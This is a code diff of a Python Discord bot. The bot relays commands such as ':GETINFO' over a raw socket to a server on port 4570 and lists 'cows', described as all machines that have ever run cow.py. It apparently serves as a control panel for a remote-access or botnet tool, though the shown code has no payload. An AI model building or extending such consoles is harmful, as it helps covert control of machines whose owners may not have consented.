@@ -11,12 +11,9 @@ def connect(command):
     port = 4570
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.connect((ip, port))
-    server.send(command.encode())
 
-    try:
-        response = server.recv(8192).decode()
-    except:
-        response = "No response"
+    server.send(command.encode())
+    response = server.recv(4096).decode()
     server.close()
     return response
 
@@ -35,23 +32,13 @@ async def on_ready():
     await bot.tree.sync()   
 
 @bot.tree.command(name="getinfo", description="Get info of cows")
-@app_commands.describe(machine_id="Index of the machine from /listcows (starts at 1)")
-async def getInfo(interaction: discord.Interaction, machine_id: int):
-    await interaction.response.send_message("Grabbing info...", ephemeral=True)
+async def getInfo(interaction: discord.Interaction):
+    await interaction.response.send_message("Attempting to get info...")
 
-    info_raw = connect(f":GETINFO\n{machine_id}")
-
-    # Each machine block starts with [
-    machine_blocks = [block.strip() for block in info_raw.strip().split("[") if block]
-
-    if machine_id < 1 or machine_id > len(machine_blocks):
-        await interaction.followup.send("Invalid machine number. Use ```/listcows``` to see valid options.")
-        return
-
-    selected_block = machine_blocks[machine_id - 1]
-    final_display = "[" + selected_block  # re-add removed `[` for formatting
-
-    await interaction.followup.send(f"```{final_display}```")
+    info = connect(":GETINFO")
+    
+    # Send the result as a code block (for formatting)
+    await interaction.followup.send(f"```{info}```")
 
 @bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
 async def listCows(interaction: discord.Interaction):
